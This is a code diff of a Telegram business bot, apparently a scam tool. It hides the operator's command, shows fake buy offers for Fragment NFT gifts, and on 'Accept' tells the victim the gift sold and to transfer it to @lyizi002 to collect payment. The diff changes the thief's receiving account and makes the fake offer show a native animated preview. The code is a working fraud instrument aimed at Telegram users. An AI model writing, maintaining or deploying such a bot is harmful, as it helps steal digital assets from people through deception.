@@ -1,14 +1,10 @@
 import asyncio
 import os
 import re
-import subprocess
-import tempfile
-import aiohttp
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import CommandStart, Command
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, LinkPreviewOptions
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
 from aiogram.exceptions import TelegramBadRequest
-from rlottie_python import LottieAnimation
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 bot = Bot(token=BOT_TOKEN)
@@ -17,10 +13,11 @@ dp = Dispatcher()
 active_users = set()
 ADMIN_ID = None 
 
+# --- ОБНОВЛЕННЫЕ СЛОВАРИ С НОВЫМ ПОЛУЧАТЕЛЕМ @lyizi002 ---
 MESSAGES = {
     "ru": {
         "offer": "Пользователь ({username})\nпредлагает вам\n<b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a>.",
-        "success": "🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n• Передайте <a href='https://t.me/lyizi002'>@lyizi002</a> для зачисления звёзд.",
         "declined": "❌ Оффер на <b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен.",
         "btn_accept": "Принять",
         "btn_decline": "Отклонить",
@@ -28,7 +25,7 @@ MESSAGES = {
     },
     "en": {
         "offer": "User ({username})\noffers you\n<b>{amount} {symbol}</b> for the gift <a href='{link}'>{pretty_name}</a>.",
-        "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> to receive stars.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/lyizi002'>@lyizi002</a> to receive stars.",
         "declined": "❌ Offer of <b>{amount} {symbol}</b> for <a href='{link}'>{pretty_name}</a> declined.",
         "btn_accept": "Accept",
         "btn_decline": "Decline",
@@ -36,7 +33,7 @@ MESSAGES = {
     },
     "ua": {
         "offer": "Користувач ({username})\nпропонує вам\n<b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a>.",
-        "success": "🎁 <a href='{link}'>{pretty_name}</a> успішно продано!\n\n• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зарахування зірок.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> успішно продано!\n\n• Передайте <a href='https://t.me/lyizi002'>@lyizi002</a> для зарахування зірок.",
         "declined": "❌ Офер на <b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a> відхилено.",
         "btn_accept": "Прийняти",
         "btn_decline": "Відхилити",
@@ -44,7 +41,7 @@ MESSAGES = {
     },
     "ar": {
         "offer": "المستخدم ({username})\nيعرض عليك\n<b>{amount} {symbol}</b> مقابل الهدية <a href='{link}'>{pretty_name}</a>.",
-        "success": "🎁 <a href='{link}'>{pretty_name}</a> تم بيعه بنجاح!\n\n• قم بالتحويل إلى <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> لاستلام النجوم.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> تم بيعه بنجاح!\n\n• قم بالتحويل إلى <a href='https://t.me/lyizi002'>@lyizi002</a> لاستلام النجوم.",
         "declined": "❌ تم رفض العرض بمبلغ <b>{amount} {symbol}</b> مقابل <a href='{link}'>{pretty_name}</a>.",
         "btn_accept": "قبول",
         "btn_decline": "رفض",
@@ -55,25 +52,6 @@ MESSAGES = {
 def get_pretty_name(slug):
     raw_name = slug.split('-')[0]
     return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
-
-def convert_lottie_to_mp4(lottie_bytes: bytes, output_path: str):
-    anim = LottieAnimation.from_data(data=lottie_bytes.decode('utf-8'))
-    total_frames = anim.lottie_animation_get_totalframe()
-    framerate = anim.lottie_animation_get_framerate()
-    if framerate <= 0: framerate = 30
-
-    with tempfile.TemporaryDirectory() as tmpdir:
-        for i in range(total_frames):
-            png_path = os.path.join(tmpdir, f"frame_{i:04d}.png")
-            anim.save_frame(png_path, frame_num=i)
-        
-        subprocess.run([
-            "ffmpeg", "-y", "-framerate", str(framerate),
-            "-i", os.path.join(tmpdir, "frame_%04d.png"),
-            "-c:v", "libx264", "-pix_fmt", "yuv420p",
-            "-vf", "pad=ceil(iw/2)*2:ceil(ih/2)*2",
-            output_path
-        ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message):
@@ -133,32 +111,27 @@ async def handle_offer_command(message: types.Message):
     caption_text = msg_data["offer"].format(username=username, amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
 
     try:
+        # Мгновенно удаляем команду
         await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])
-
-        lottie_url = f"https://nft.fragment.com/gift/{gift_slug}.lottie.json"
-        async with aiohttp.ClientSession() as session:
-            async with session.get(lottie_url) as resp:
-                if resp.status != 200: raise Exception("Нет анимации")
-                lottie_bytes = await resp.read()
-
-        mp4_path = f"/tmp/{gift_slug}.mp4"
-        convert_lottie_to_mp4(lottie_bytes, mp4_path)
 
         keyboard = InlineKeyboardMarkup(inline_keyboard=[[
             InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}"),
             InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}")
         ]])
 
-        video_file = FSInputFile(mp4_path)
-        await bot.send_animation(
+        # Отправляем текст с нативной анимацией от ссылки
+        await bot.send_message(
             chat_id=message.chat.id,
-            animation=video_file,
-            caption=caption_text,
+            text=caption_text,
             reply_markup=keyboard,
             business_connection_id=business_connection_id,
-            parse_mode="HTML"
+            parse_mode="HTML",
+            link_preview_options=LinkPreviewOptions(
+                url=link,
+                show_above_text=True,
+                prefer_large_media=True
+            )
         )
-        os.remove(mp4_path)
 
     except Exception as e:
         if ADMIN_ID:
@@ -185,17 +158,16 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
             await callback.message.delete()
 
         if action == "accept":
-            # ВОЗВРАЩАЕМ СТАРЫЙ ТЕКСТ
             new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
-            
-            # ВОЗВРАЩАЕМ ОДНУ КНОПКУ "ПЕРЕДАТЬ NFT"
+            # Кнопка ведет на нового получателя @lyizi002
             new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
+                [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/lyizi002")]
             ])
         else:
             new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
             new_keyboard = None
 
+        # Отправляем новое сообщение с анимацией
         kwargs = {
             "chat_id": callback.message.chat.id, 
             "text": new_text, 
@@ -205,6 +177,7 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         }
         
         if business_connection_id: kwargs["business_connection_id"] = business_connection_id
+        
         await bot.send_message(**kwargs)
         await callback.answer()
     except Exception as e:
